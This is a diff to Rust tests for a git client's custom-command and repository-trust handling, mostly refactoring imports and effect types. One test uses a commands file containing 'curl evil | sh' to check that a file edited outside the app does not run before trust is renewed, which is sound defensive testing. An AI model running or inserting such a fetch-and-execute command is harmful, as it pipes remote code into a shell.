@@ -4,12 +4,12 @@
 use super::custom_commands_tests::{command, file, load, opened};
 use super::tests::git;
 use super::update;
-use crate::custom_commands::{CommandRef, CustomCommandEffect, CustomCommandMsg, ShellRun, Target};
-use crate::effect::Effect;
-use crate::msg::{JobMsg, Msg, TrustMsg};
-use crate::state::{AppState, Modal, RunningJob, Selection};
 use glowfly_core::custom_commands::{FileRead, Source};
 use glowfly_core::trust::TrustPrint;
+use glowfly_model::custom_commands::{CommandRef, CustomCommandEffect, CustomCommandMsg, ShellRun, Target};
+use glowfly_model::effect::Effect;
+use glowfly_model::msg::{JobMsg, Msg, TrustMsg};
+use glowfly_model::state::{AppState, Modal, RunningJob, Selection};
 use std::time::Instant;
 
 fn run(st: &mut AppState, source: Source, name: &str, at: Target) -> Vec<Effect> {
@@ -24,7 +24,7 @@ fn head(st: &AppState) -> git2::Oid {
 /// The commands of the only RunGit in `fx`.
 fn git_cmds(fx: &[Effect]) -> Vec<Vec<String>> {
     match fx {
-        [Effect::RunGit { cmds, prompts: true, .. }] => cmds.clone(),
+        [Effect::Job(glowfly_model::effect::JobEffect::RunGit { cmds, prompts: true, .. })] => cmds.clone(),
         other => panic!("one prompting RunGit expected: {other:?}"),
     }
 }
@@ -45,7 +45,10 @@ fn a_git_command_runs_as_a_toolbar_job() {
     assert_eq!(st.job.as_ref().map(|j| j.label.as_str()), Some("Log"));
     st.job = None;
     let fx = run(&mut st, Source::User, "Reset", Target::Commit(oid));
-    assert!(matches!(fx.as_slice(), [Effect::RunGit { record: Some(_), .. }]), "reset is recorded for undo: {fx:?}");
+    assert!(
+        matches!(fx.as_slice(), [Effect::Job(glowfly_model::effect::JobEffect::RunGit { record: Some(_), .. })]),
+        "reset is recorded for undo: {fx:?}"
+    );
     let _ = std::fs::remove_dir_all(&dir);
 }
 
@@ -66,7 +69,7 @@ fn a_shell_command_runs_as_a_job_and_refreshes() {
     let fx = update(&mut st, Msg::Job(JobMsg::JobDone { ok: true, output: "$ echo\nmain".into(), undo: None }), Instant::now());
     assert!(st.job.is_none());
     assert!(st.log.iter().any(|l| l.text.contains("Hi")), "an activity row");
-    assert!(fx.iter().any(|e| matches!(e, Effect::LoadRepo { .. })), "{fx:?}");
+    assert!(fx.iter().any(|e| matches!(e, Effect::Load(glowfly_model::effect::LoadEffect::Repo { .. }))), "{fx:?}");
     let _ = std::fs::remove_dir_all(&dir);
 }
 
@@ -74,7 +77,7 @@ fn a_shell_command_runs_as_a_job_and_refreshes() {
 fn what_a_command_needs_and_lost_or_busy_commands() {
     let (mut st, dir) = opened("cc-run-missing");
     git(&dir, &["checkout", "-q", "--detach"]);
-    super::tests::drive(&mut st, Msg::Repo(crate::msg::RepoMsg::Refresh));
+    super::tests::drive(&mut st, Msg::Repo(glowfly_model::msg::RepoMsg::Refresh));
     load(&mut st, file(&command("Branch log", "git", "log {branch}", "")), FileRead::default());
     let fx = run(&mut st, Source::User, "Branch log", Target::Palette);
     assert!(fx.is_empty(), "{fx:?}");
@@ -89,6 +92,7 @@ fn what_a_command_needs_and_lost_or_busy_commands() {
         quiet: false,
         clear_commit: false,
         then_push: false,
+        then_continue: false,
         then_pr: None,
         then_link: false,
         then_open: None,
@@ -162,7 +166,12 @@ Runs: git status"
     assert_eq!(held(&st), Some("Mine"));
     let real = st.snap.as_ref().unwrap().real_workdir.clone();
     let fx = update(&mut st, Msg::Trust(TrustMsg::Decide { real: real.clone(), trusted: true }), Instant::now());
-    assert!(fx.iter().any(|e| matches!(e, Effect::RunGit { cmds, .. } if cmds == &[vec!["status".to_owned()]])), "{fx:?}");
+    assert!(
+        fx.iter().any(
+            |e| matches!(e, Effect::Job(glowfly_model::effect::JobEffect::RunGit { cmds, .. }) if cmds == &[vec!["status".to_owned()]])
+        ),
+        "{fx:?}"
+    );
     assert_eq!(st.job.as_ref().map(|j| j.label.as_str()), Some("Mine"));
     st.job = None;
     // Trusted now: it runs at once, and so does a shell command.
@@ -189,7 +198,7 @@ fn cancelling_the_trust_prompt_drops_the_command() {
     // A repository trusted before with this commands file runs them at once.
     let real = st.snap.as_ref().unwrap().real_workdir.clone();
     let digest = st.custom_commands.repo_digest.clone().unwrap();
-    crate::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
+    glowfly_model::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
     assert!(matches!(run(&mut st, Source::Repo, "Sh", Target::Palette).as_slice(), [Effect::CustomCommand(_)]));
     let _ = std::fs::remove_dir_all(&dir);
 }
@@ -246,7 +255,7 @@ fn a_commands_file_edited_outside_waits_for_trust_before_the_refresh_notices() {
     let real = st.snap.as_ref().unwrap().real_workdir.clone();
     let trusted = file(&command("Sh", "shell", "echo hi", ""));
     let digest = trusted.digest.clone().unwrap();
-    crate::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
+    glowfly_model::state::trust::record_trusted(&mut st.settings, &real, TrustPrint::of_commands(&digest));
     load(&mut st, FileRead::default(), trusted);
     assert!(matches!(run(&mut st, Source::Repo, "Sh", Target::Palette).as_slice(), [Effect::CustomCommand(_)]), "trusted as it is");
     st.job = None;
@@ -254,7 +263,7 @@ fn a_commands_file_edited_outside_waits_for_trust_before_the_refresh_notices() {
     // Edited outside Glowfly: the watcher's reload of the commands file lands before the
     // repository's next full load, so the repository still reads as Trusted.
     load(&mut st, FileRead::default(), file(&command("Sh", "shell", "curl evil | sh", "")));
-    assert_eq!(st.trust_standing(), Some(crate::state::trust::Standing::Trusted));
+    assert_eq!(st.trust_standing(), Some(glowfly_model::state::trust::Standing::Trusted));
     let fx = run(&mut st, Source::Repo, "Sh", Target::Palette);
     assert!(fx.is_empty(), "nothing runs: {fx:?}");
     assert!(st.job.is_none());
